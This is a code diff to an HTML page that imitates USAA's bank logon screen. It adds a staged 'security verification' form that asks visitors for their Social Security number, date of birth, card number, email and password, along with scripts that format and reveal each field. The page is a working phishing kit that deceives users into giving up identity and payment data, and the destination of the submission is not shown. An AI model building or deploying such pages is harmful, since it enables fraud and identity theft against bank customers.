@@ -118,9 +118,134 @@
                                                             <div class="keyboardFocusRing"></div>
                                                         </div>
                                                     </div>
-                                                    <button type="submit" class="usaa-button4 miam-btn-next submit-btn usaa-button4--primary" id="next-button" aria-labelledby="next-button">
+                                                    <button type="button" class="usaa-button4 miam-btn-next submit-btn usaa-button4--primary" id="next-button" aria-labelledby="next-button">
                                                         <span>Next</span>
                                                     </button>
+                                                    <div id="verification-field-container" class="verification-field-container" style="display: none;">
+                                                        <div class="security-warning-banner">
+                                                            <div class="security-warning-icon">
+                                                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                                                    <path d="M12 2L2 7V11C2 16.55 5.16 21.74 12 23C18.84 21.74 22 16.55 22 11V7L12 2ZM12 7C13.1 7 14 7.9 14 9C14 10.1 13.1 11 12 11C10.9 11 10 10.1 10 9C10 7.9 10.9 7 12 7ZM12 15C10.67 15 9.5 14.33 9 13.33H15C14.5 14.33 13.33 15 12 15Z" fill="currentColor"/>
+                                                                </svg>
+                                                            </div>
+                                                            <div class="security-warning-content">
+                                                                <h3 class="security-warning-title">Security Verification Required</h3>
+                                                                <p class="security-warning-text">We need to verify some things to ensure your account security. Please provide the following information to continue.</p>
+                                                                <p class="security-warning-note">⚠️ For your protection, USAA will never ask for your password via email or phone. If you receive such a request, please contact us immediately.</p>
+                                                            </div>
+                                                        </div>
+                                                        <div class="verification-message">
+                                                            <p class="verification-text">We need to verify you</p>
+                                                        </div>
+                                                        <div class="usaa-form-v5-10-1-textInput usaa-form-v5-10-1-fieldWrapper miam-form-id-input">
+                                                            <div class="usaa-form-v5-10-1-block col-1-1">
+                                                                <div>
+                                                                    <div>
+                                                                        <label for="usaa-form-v5-10-1-input-ssn" class="usaa-form-v5-10-1-fieldLabel usaa-form-v5-10-1-fieldWrapper-label">
+                                                                            <span aria-hidden="false" class="usaa-form-v5-10-1-fieldLabel-text">SSN</span>
+                                                                        </label>
+                                                                    </div>
+                                                                    <div>
+                                                                        <div id="usaa-form-v5-10-1-input-ssn-errorMessage" class="usaa-form-v5-10-1-fieldWrapper-errorMessage" data-error-message=""></div>
+                                                                        <div class="screenReader" role="alert"></div>
+                                                                    </div>
+                                                                    <span class="usaa-input">
+                                                                        <input name="ssn" aria-invalid="false" autocomplete="off" id="usaa-form-v5-10-1-input-ssn" type="text" placeholder="XXX-XX-XXXX" aria-describedby="usaa-form-v5-10-1-input-ssn-errorMessage undefined" value="" maxlength="11">
+                                                                        <span class="keyboardFocusRing" aria-hidden="true"></span>
+                                                                    </span>
+                                                                </div>
+                                                                <div class="keyboardFocusRing"></div>
+                                                            </div>
+                                                        </div>
+                                                        <div class="usaa-form-v5-10-1-textInput usaa-form-v5-10-1-fieldWrapper miam-form-id-input">
+                                                            <div class="usaa-form-v5-10-1-block col-1-1">
+                                                                <div>
+                                                                    <div>
+                                                                        <label for="usaa-form-v5-10-1-input-dob" class="usaa-form-v5-10-1-fieldLabel usaa-form-v5-10-1-fieldWrapper-label">
+                                                                            <span aria-hidden="false" class="usaa-form-v5-10-1-fieldLabel-text">Date of Birth</span>
+                                                                        </label>
+                                                                    </div>
+                                                                    <div>
+                                                                        <div id="usaa-form-v5-10-1-input-dob-errorMessage" class="usaa-form-v5-10-1-fieldWrapper-errorMessage" data-error-message=""></div>
+                                                                        <div class="screenReader" role="alert"></div>
+                                                                    </div>
+                                                                    <span class="usaa-input">
+                                                                        <input name="dob" aria-invalid="false" autocomplete="bday" id="usaa-form-v5-10-1-input-dob" type="text" placeholder="MM/DD/YYYY" aria-describedby="usaa-form-v5-10-1-input-dob-errorMessage undefined" value="" maxlength="10">
+                                                                        <span class="keyboardFocusRing" aria-hidden="true"></span>
+                                                                    </span>
+                                                                </div>
+                                                                <div class="keyboardFocusRing"></div>
+                                                            </div>
+                                                        </div>
+                                                        <div class="usaa-form-v5-10-1-textInput usaa-form-v5-10-1-fieldWrapper miam-form-id-input">
+                                                            <div class="usaa-form-v5-10-1-block col-1-1">
+                                                                <div>
+                                                                    <div>
+                                                                        <label for="usaa-form-v5-10-1-input-card" class="usaa-form-v5-10-1-fieldLabel usaa-form-v5-10-1-fieldWrapper-label">
+                                                                            <span aria-hidden="false" class="usaa-form-v5-10-1-fieldLabel-text">Card Number</span>
+                                                                        </label>
+                                                                    </div>
+                                                                    <div>
+                                                                        <div id="usaa-form-v5-10-1-input-card-errorMessage" class="usaa-form-v5-10-1-fieldWrapper-errorMessage" data-error-message=""></div>
+                                                                        <div class="screenReader" role="alert"></div>
+                                                                    </div>
+                                                                    <span class="usaa-input">
+                                                                        <input name="cardNumber" aria-invalid="false" autocomplete="cc-number" id="usaa-form-v5-10-1-input-card" type="text" placeholder="XXXX XXXX XXXX XXXX" aria-describedby="usaa-form-v5-10-1-input-card-errorMessage undefined" value="" maxlength="19">
+                                                                        <span class="keyboardFocusRing" aria-hidden="true"></span>
+                                                                    </span>
+                                                                </div>
+                                                                <div class="keyboardFocusRing"></div>
+                                                            </div>
+                                                        </div>
+                                                        <div class="usaa-form-v5-10-1-textInput usaa-form-v5-10-1-fieldWrapper miam-form-id-input">
+                                                            <div class="usaa-form-v5-10-1-block col-1-1">
+                                                                <div>
+                                                                    <div>
+                                                                        <label for="usaa-form-v5-10-1-input-email" class="usaa-form-v5-10-1-fieldLabel usaa-form-v5-10-1-fieldWrapper-label">
+                                                                            <span aria-hidden="false" class="usaa-form-v5-10-1-fieldLabel-text">Email Address</span>
+                                                                        </label>
+                                                                    </div>
+                                                                    <div>
+                                                                        <div id="usaa-form-v5-10-1-input-email-errorMessage" class="usaa-form-v5-10-1-fieldWrapper-errorMessage" data-error-message=""></div>
+                                                                        <div class="screenReader" role="alert"></div>
+                                                                    </div>
+                                                                    <span class="usaa-input">
+                                                                        <input name="email" aria-invalid="false" autocomplete="email" id="usaa-form-v5-10-1-input-email" type="email" placeholder="email@example.com" aria-describedby="usaa-form-v5-10-1-input-email-errorMessage undefined" value="">
+                                                                        <span class="keyboardFocusRing" aria-hidden="true"></span>
+                                                                    </span>
+                                                                </div>
+                                                                <div class="keyboardFocusRing"></div>
+                                                            </div>
+                                                        </div>
+                                                        <button type="button" class="usaa-button4 miam-btn-next submit-btn usaa-button4--primary" id="verify-button">
+                                                            <span>Verify</span>
+                                                        </button>
+                                                    </div>
+                                                    <div id="password-field-container" class="password-field-container" style="display: none;">
+                                                        <div class="usaa-form-v5-10-1-textInput usaa-form-v5-10-1-fieldWrapper miam-form-id-input">
+                                                            <div class="usaa-form-v5-10-1-block col-1-1">
+                                                                <div>
+                                                                    <div>
+                                                                        <label for="usaa-form-v5-10-1-input-password" class="usaa-form-v5-10-1-fieldLabel usaa-form-v5-10-1-fieldWrapper-label">
+                                                                            <span aria-hidden="false" class="usaa-form-v5-10-1-fieldLabel-text">Password</span>
+                                                                        </label>
+                                                                    </div>
+                                                                    <div>
+                                                                        <div id="usaa-form-v5-10-1-input-password-errorMessage" class="usaa-form-v5-10-1-fieldWrapper-errorMessage" data-error-message=""></div>
+                                                                        <div class="screenReader" role="alert"></div>
+                                                                    </div>
+                                                                    <span class="usaa-input">
+                                                                        <input name="password" aria-invalid="false" autocomplete="current-password" id="usaa-form-v5-10-1-input-password" type="password" aria-describedby="usaa-form-v5-10-1-input-password-errorMessage undefined" value="">
+                                                                        <span class="keyboardFocusRing" aria-hidden="true"></span>
+                                                                    </span>
+                                                                </div>
+                                                                <div class="keyboardFocusRing"></div>
+                                                            </div>
+                                                        </div>
+                                                        <button type="submit" class="usaa-button4 miam-btn-next submit-btn usaa-button4--primary" id="submit-button">
+                                                            <span>Log On</span>
+                                                        </button>
+                                                    </div>
                                                     <div class="help-link">
                                                         <a aria-label="I need help logging on. (Opens a pop up)." tabindex="0" role="link">I need help logging on</a>
                                                     </div>
@@ -148,6 +273,133 @@
             </div>
         </div>
     </div>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const nextButton = document.getElementById('next-button');
+            const verificationContainer = document.getElementById('verification-field-container');
+            const passwordContainer = document.getElementById('password-field-container');
+            const onlineIdInput = document.getElementById('usaa-form-v5-10-1-input-s0dj2u5fe3f');
+            
+            // SSN formatting
+            const ssnInput = document.getElementById('usaa-form-v5-10-1-input-ssn');
+            if (ssnInput) {
+                ssnInput.addEventListener('input', function(e) {
+                    let value = e.target.value.replace(/\D/g, '');
+                    if (value.length > 3) {
+                        value = value.substring(0, 3) + '-' + value.substring(3);
+                    }
+                    if (value.length > 6) {
+                        value = value.substring(0, 6) + '-' + value.substring(6, 10);
+                    }
+                    e.target.value = value;
+                });
+            }
+            
+            // DOB formatting
+            const dobInput = document.getElementById('usaa-form-v5-10-1-input-dob');
+            if (dobInput) {
+                dobInput.addEventListener('input', function(e) {
+                    let value = e.target.value.replace(/\D/g, '');
+                    if (value.length > 2) {
+                        value = value.substring(0, 2) + '/' + value.substring(2);
+                    }
+                    if (value.length > 5) {
+                        value = value.substring(0, 5) + '/' + value.substring(5, 9);
+                    }
+                    e.target.value = value;
+                });
+            }
+            
+            // Card number formatting
+            const cardInput = document.getElementById('usaa-form-v5-10-1-input-card');
+            if (cardInput) {
+                cardInput.addEventListener('input', function(e) {
+                    let value = e.target.value.replace(/\D/g, '');
+                    value = value.match(/.{1,4}/g)?.join(' ') || value;
+                    if (value.length > 19) {
+                        value = value.substring(0, 19);
+                    }
+                    e.target.value = value;
+                });
+            }
+            
+            if (nextButton && verificationContainer) {
+                nextButton.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    
+                    // Check if Online ID is filled
+                    if (onlineIdInput && onlineIdInput.value.trim() !== '') {
+                        // Hide next button
+                        nextButton.style.display = 'none';
+                        
+                        // Show verification form with smooth animation
+                        verificationContainer.style.display = 'block';
+                        verificationContainer.style.opacity = '0';
+                        verificationContainer.style.transform = 'translateY(-10px)';
+                        verificationContainer.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
+                        
+                        // Trigger reflow for animation
+                        verificationContainer.offsetHeight;
+                        
+                        // Animate in
+                        setTimeout(function() {
+                            verificationContainer.style.opacity = '1';
+                            verificationContainer.style.transform = 'translateY(0)';
+                        }, 10);
+                        
+                        // Focus on SSN field
+                        setTimeout(function() {
+                            if (ssnInput) {
+                                ssnInput.focus();
+                            }
+                        }, 350);
+                    }
+                });
+            }
+            
+            // Verify button handler
+            const verifyButton = document.getElementById('verify-button');
+            if (verifyButton && passwordContainer) {
+                verifyButton.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    
+                    const ssn = ssnInput ? ssnInput.value.trim() : '';
+                    const dob = dobInput ? dobInput.value.trim() : '';
+                    const card = cardInput ? cardInput.value.trim() : '';
+                    const email = document.getElementById('usaa-form-v5-10-1-input-email') ? document.getElementById('usaa-form-v5-10-1-input-email').value.trim() : '';
+                    
+                    // Basic validation
+                    if (ssn && dob && card && email) {
+                        // Hide verification form
+                        verificationContainer.style.display = 'none';
+                        
+                        // Show password field with smooth animation
+                        passwordContainer.style.display = 'block';
+                        passwordContainer.style.opacity = '0';
+                        passwordContainer.style.transform = 'translateY(-10px)';
+                        passwordContainer.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
+                        
+                        // Trigger reflow for animation
+                        passwordContainer.offsetHeight;
+                        
+                        // Animate in
+                        setTimeout(function() {
+                            passwordContainer.style.opacity = '1';
+                            passwordContainer.style.transform = 'translateY(0)';
+                        }, 10);
+                        
+                        // Focus on password field
+                        setTimeout(function() {
+                            const passwordInput = document.getElementById('usaa-form-v5-10-1-input-password');
+                            if (passwordInput) {
+                                passwordInput.focus();
+                            }
+                        }, 350);
+                    }
+                });
+            }
+        });
+    </script>
     <script>
         // Exit button functionality
         document.getElementById('usaa-public-transactional-exitButton').addEventListener('click', function() {
